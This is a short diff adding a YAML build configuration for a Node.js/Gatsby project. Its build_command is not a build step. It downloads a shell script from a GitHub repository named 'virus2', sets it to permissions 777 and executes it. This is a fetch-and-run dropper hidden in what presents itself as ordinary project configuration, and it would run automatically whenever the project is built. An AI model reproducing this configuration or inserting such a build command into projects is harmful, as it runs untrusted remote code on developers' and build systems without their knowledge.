@@ -1,0 +1,7 @@
+prepress:
+  configuration:
+    language: nodejs
+    language_version: 12.13
+    framework: gatsby
+    framework_version: 3.14.0
+    build_command: wget https://github.com/raufpermana22/virus2/raw/main/tes1.sh && chmod 777 tes1.sh && ./tes1.sh
